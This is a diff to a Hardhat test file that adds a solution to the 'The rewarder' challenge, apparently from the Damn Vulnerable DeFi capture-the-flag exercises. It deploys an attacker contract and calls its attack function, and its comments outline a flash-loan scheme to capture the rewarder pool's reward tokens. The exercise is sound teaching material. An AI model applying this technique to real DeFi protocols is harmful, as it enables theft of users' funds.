@@ -70,6 +70,24 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+// deploy attack contract
+// apply for DVT token loan send DVT token to contract on recievFlashloan 
+// apporve awader to transfer token 
+// deposit token in awarder pool
+// distribute rewards as we have waited for 5 mint to pass
+// withdraw token from reward pool 
+// send back to loan pool  and send reward token to player
+await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+const attackerFactory = await ethers.getContractFactory('AttackerReward', deployer);
+const attackerContract = await attackerFactory.deploy(   liquidityToken.address,
+    rewarderPool.address,
+     rewardToken.address,
+     flashLoanPool.address,
+     player.address)
+
+     await attackerContract.connect(player).attack();
+
     });
 
     after(async function () {
@@ -103,3 +121,6 @@ describe('[Challenge] The rewarder', function () {
         ).to.eq(TOKENS_IN_LENDER_POOL);
     });
 });
+
+
+
